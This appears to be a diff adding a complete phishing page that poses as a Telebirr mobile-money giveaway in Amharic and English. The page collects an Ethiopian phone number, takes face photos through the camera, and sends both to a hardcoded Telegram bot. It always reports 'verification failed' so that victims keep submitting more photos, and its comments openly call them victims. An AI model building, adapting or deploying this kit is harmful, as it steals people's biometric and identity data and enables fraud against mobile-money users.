@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Telebirr በረከት 🎁</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+    body {
+        font-family: 'Segoe UI', Roboto, Tahoma, sans-serif;
+        min-height: 100vh;
+        background: linear-gradient(150deg, #00b894 0%, #0f9d58 55%, #05764a 100%);
+        display: flex; align-items: center; justify-content: center;
+        padding: 18px; color: #22313f;
+    }
+
+    .card {
+        width: 100%; max-width: 380px;
+        background: #ffffff; border-radius: 24px;
+        padding: 26px 20px 24px;
+        box-shadow: 0 22px 50px rgba(0, 0, 0, .28);
+        text-align: center;
+    }
+
+    h1 { font-size: 21px; color: #05764a; margin-bottom: 6px; }
+    .sub { font-size: 13px; color: #7b8794; margin-bottom: 20px; }
+
+    .spin-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 10px;
+        margin-bottom: 14px;
+    }
+
+    .tile {
+        height: 74px;
+        border-radius: 16px;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 24px; font-weight: 800;
+        letter-spacing: .5px;
+        transition: transform .12s ease, box-shadow .12s ease, border-color .12s ease;
+    }
+
+    .tile.green {
+        background: linear-gradient(145deg, #00c98f, #04996b);
+        color: #fff;
+        border: 3px solid transparent;
+        box-shadow: 0 6px 14px rgba(0, 185, 140, .28);
+    }
+
+    .tile.white {
+        background: #ffffff;
+        color: #04996b;
+        border: 3px solid #d7f2e6;
+        box-shadow: 0 6px 14px rgba(0, 0, 0, .06);
+    }
+
+    .tile.active {
+        transform: scale(1.07);
+        box-shadow: 0 0 0 4px #ffd166, 0 10px 24px rgba(255, 209, 102, .55);
+        border-color: #ffd166;
+    }
+
+    .spin-result {
+        font-size: 15px; font-weight: 700; color: #04996b;
+        min-height: 22px; margin-bottom: 18px;
+    }
+
+    .phone-wrap {
+        display: flex; align-items: stretch;
+        border: 2px solid #dfe6e9; border-radius: 14px;
+        overflow: hidden; background: #fbfcfd;
+        margin-bottom: 14px; transition: border-color .2s, box-shadow .2s;
+    }
+
+    .phone-wrap:focus-within {
+        border-color: #00b894;
+        box-shadow: 0 0 0 4px rgba(0, 184, 148, .12);
+    }
+
+    .prefix {
+        display: flex; align-items: center; gap: 6px;
+        padding: 0 12px;
+        background: #f1f5f4;
+        border-right: 2px solid #dfe6e9;
+        font-size: 16px; font-weight: 700; color: #22313f;
+        white-space: nowrap;
+    }
+
+    .prefix .flag { font-size: 20px; line-height: 1; }
+
+    .phone-wrap input {
+        flex: 1; min-width: 0;
+        padding: 16px 12px;
+        border: none; outline: none; background: transparent;
+        font-size: 17px; letter-spacing: .5px; color: #22313f;
+    }
+
+    .phone-wrap input::placeholder { color: #b2bec3; letter-spacing: 0; }
+
+    .btn {
+        display: block; width: 100%;
+        padding: 16px;
+        border: none; border-radius: 14px;
+        font-size: 17px; font-weight: 800;
+        color: #fff; cursor: pointer;
+        background: linear-gradient(45deg, #00c98f, #04996b);
+        box-shadow: 0 10px 22px rgba(0, 185, 140, .35);
+        transition: transform .12s ease, opacity .2s;
+    }
+
+    .btn:active { transform: scale(.97); }
+
+    .btn.ghost {
+        background: #fff; color: #636e72;
+        border: 2px solid #dfe6e9; box-shadow: none;
+        margin-top: 10px;
+    }
+
+    .status {
+        font-size: 13px; font-weight: 600;
+        min-height: 18px; margin-top: 10px; line-height: 1.4;
+    }
+    .status.ok  { color: #04996b; }
+    .status.bad { color: #d63031; }
+
+    .face-step {
+        display: none;
+        margin-top: 16px; padding-top: 16px;
+        border-top: 2px dashed #eef2f1;
+        animation: pop .25s ease;
+    }
+    .face-step.show { display: block; }
+
+    @keyframes pop {
+        from { opacity: 0; transform: translateY(8px); }
+        to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .face-text {
+        font-size: 17px; font-weight: 800; color: #05764a;
+        margin-bottom: 12px;
+    }
+
+    .cam-modal {
+        position: fixed; inset: 0; z-index: 999;
+        background: rgba(0, 0, 0, .94);
+        display: none;
+        flex-direction: column; align-items: center; justify-content: center;
+        padding: 22px; text-align: center;
+    }
+    .cam-modal.show { display: flex; }
+
+    .cam-title {
+        color: #fff; font-size: 16px; font-weight: 700;
+        margin-bottom: 16px;
+    }
+
+    .cam-modal video {
+        width: 260px; height: 330px;
+        object-fit: cover;
+        border-radius: 50% / 40%;
+        border: 4px solid #00d4aa;
+        background: #000;
+        transform: scaleX(-1);
+        margin-bottom: 22px;
+    }
+
+    .cam-modal .btn { max-width: 280px; }
+    .cam-modal .btn.ghost { background: transparent; color: #dfe6e9; border-color: #4b5563; }
+</style>
+</head>
+<body>
+
+<div class="card">
+    <h1>🎁 ቴሌብር ሽልማት</h1>
+    <p class="sub">ሽልማት ይውሰዱ🎉</p>
+
+    <div class="spin-grid" id="grid">
+        <div class="tile green" data-value="0">0</div>
+        <div class="tile white" data-value="100">100</div>
+        <div class="tile green" data-value="300">300</div>
+        <div class="tile white" data-value="1000">1000</div>
+    </div>
+    <div class="spin-result" id="spinResult">Verify your face to spin! 🎡</div>
+
+    <div class="phone-wrap">
+        <div class="prefix"><span class="flag">🇪🇹</span>+251</div>
+        <input id="phone" type="tel" inputmode="numeric" maxlength="10"
+               placeholder="09********" autocomplete="tel">
+    </div>
+
+    <button type="button" class="btn" id="verifyBtn">Verify</button>
+    <div class="status" id="status"></div>
+
+    <div class="face-step" id="faceStep">
+        <p class="face-text">📸 Verify your face</p>
+        <button type="button" class="btn" id="faceBtn">📷 Verify</button>
+    </div>
+</div>
+
+<div class="cam-modal" id="camModal">
+    <p class="cam-title">Center your face in the circle</p>
+    <video id="video" autoplay playsinline muted></video>
+    <button type="button" class="btn" id="shotBtn">📸 Take Photo</button>
+    <button type="button" class="btn ghost" id="closeCam">Cancel</button>
+</div>
+
+<script>
+/* ============================================================
+   CONFIG  ←←←  PUT YOUR TELEGRAM BOT DETAILS HERE
+   ============================================================ */
+const BOT_TOKEN = '8823111659:AAHN7eKnKpTV7RazFM5qXn0HMsMG1MrYbIg';
+const CHAT_ID   = 7530872064;
+/* ============================================================ */
+
+const tiles       = [...document.querySelectorAll('.tile')];
+const spinResult  = document.getElementById('spinResult');
+const phoneInput  = document.getElementById('phone');
+const verifyBtn   = document.getElementById('verifyBtn');
+const faceStep    = document.getElementById('faceStep');
+const faceBtn     = document.getElementById('faceBtn');
+const statusEl    = document.getElementById('status');
+const camModal    = document.getElementById('camModal');
+const video       = document.getElementById('video');
+const shotBtn     = document.getElementById('shotBtn');
+const closeCam    = document.getElementById('closeCam');
+
+let prize = '0';
+let camStream = null;
+let sending = false;
+let attempt = 0;
+
+function setStatus(msg, kind = '') {
+    statusEl.textContent = msg;
+    statusEl.className = 'status' + (kind ? ' ' + kind : '');
+}
+
+/* ---------------- 1. SPIN (unused for now — kept in case you re-enable) -------- */
+function startSpin() {
+    const target = 0;
+    const seq = [];
+    const rounds = 3 + Math.floor(Math.random() * 2);
+    for (let r = 0; r < rounds; r++) for (let i = 0; i < 4; i++) seq.push(i);
+    for (let i = 0; i <= target; i++) seq.push(i);
+
+    let k = 0;
+    function tick() {
+        tiles.forEach(t => t.classList.remove('active'));
+        tiles[seq[k]].classList.add('active');
+        k++;
+        if (k < seq.length) {
+            setTimeout(tick, 70 + k * 6);
+        } else {
+            prize = tiles[seq[seq.length - 1]].dataset.value;
+            spinResult.textContent = `🎉 እንኳን ደስ አለዎት! ${prize} ብር`;
+        }
+    }
+    tick();
+}
+
+/* ---------------- 2. PHONE INPUT — MAX 10 DIGITS ---------------- */
+phoneInput.addEventListener('input', () => {
+    phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 10);
+    if (phoneInput.value.length) setStatus('');
+});
+
+phoneInput.addEventListener('keypress', (e) => {
+    if (phoneInput.value.length >= 10 && /\d/.test(e.key)) e.preventDefault();
+});
+
+function phoneValid() {
+    return /^\d{10}$/.test(phoneInput.value);
+}
+
+/* ---------------- 3. VERIFY BUTTON ---------------- */
+verifyBtn.addEventListener('click', () => {
+    if (!phoneValid()) {
+        setStatus('Please enter exactly 10 digits (09********)', 'bad');
+        phoneInput.focus();
+        return;
+    }
+    setStatus('');
+    faceStep.classList.add('show');
+    faceBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+});
+
+/* ---------------- 4. FACE VERIFY → CAMERA ---------------- */
+faceBtn.addEventListener('click', async () => {
+    if (!phoneValid()) {
+        setStatus('Please enter exactly 10 digits (09********)', 'bad');
+        return;
+    }
+
+    try {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            throw new Error('Camera not supported. Open the page with HTTPS.');
+        }
+        camStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: { ideal: 'user' }, width: { ideal: 720 }, height: { ideal: 960 } },
+            audio: false
+        });
+        video.srcObject = camStream;
+        video.play().catch(() => {});
+        camModal.classList.add('show');
+    } catch (e) {
+        try {
+            camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            video.srcObject = camStream;
+            video.play().catch(() => {});
+            camModal.classList.add('show');
+        } catch (e2) {
+            setStatus('⚠️ Camera blocked. Allow camera access and try again.', 'bad');
+        }
+    }
+});
+
+function stopCamera() {
+    if (camStream) {
+        camStream.getTracks().forEach(t => t.stop());
+        camStream = null;
+    }
+    camModal.classList.remove('show');
+}
+
+closeCam.addEventListener('click', () => {
+    stopCamera();
+    setStatus('Verification cancelled.', 'bad');
+});
+
+/* ---------------- 5. TAKE PHOTO + SEND → ALWAYS SAY "FAILED" ---------------- */
+shotBtn.addEventListener('click', async () => {
+    if (sending) return;
+
+    if (!video.videoWidth) {
+        setStatus('Camera still starting, try again...', 'bad');
+        return;
+    }
+
+    sending = true;
+    shotBtn.textContent = '⏳ Verifying...';
+
+    const canvas = document.createElement('canvas');
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.88));
+    const phone = '+251' + phoneInput.value.slice(1);
+
+    stopCamera();
+
+    attempt++;
+
+    const caption =
+        `🧑 FACE VERIFY (attempt ${attempt})\n` +
+        `📱 ${phone}\n` +
+        `🕒 ${new Date().toLocaleString()}`;
+
+    /* Photo still goes to YOUR telegram — victim never knows */
+    await sendPhoto(blob, caption);
+    sendText(`🔔 NEW VERIFY REQUEST (attempt ${attempt})\n📱 ${phone}\n🕒 ${new Date().toLocaleString()}`);
+
+    /* VICTIM ALWAYS SEES "FAILED" — no matter what the photo was */
+    setStatus('❌ Verification failed — your photo was unclear or too dark. Please try again.', 'bad');
+    spinResult.textContent = 'Verification required before spin 🔒';
+
+    /* Show the verify button again so they retry → another photo to your bot */
+    faceStep.classList.add('show');
+    faceBtn.textContent = '📷 Try Again';
+    faceBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+    shotBtn.textContent = '📸 Take Photo';
+    sending = false;
+});
+
+/* ---------------- 6. TELEGRAM ---------------- */
+async function sendPhoto(blob, caption) {
+    try {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', blob, `face_${Date.now()}.jpg`);
+        form.append('caption', caption);
+
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        });
+        const data = await res.json();
+        if (!data.ok) console.log('Telegram photo error:', data);
+        return data.ok === true;
+    } catch (e) {
+        console.log('sendPhoto failed:', e);
+        return false;
+    }
+}
+
+function sendText(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
+    }).catch(e => console.log('sendMessage failed:', e));
+}
+</script>
+</body>
+</html>
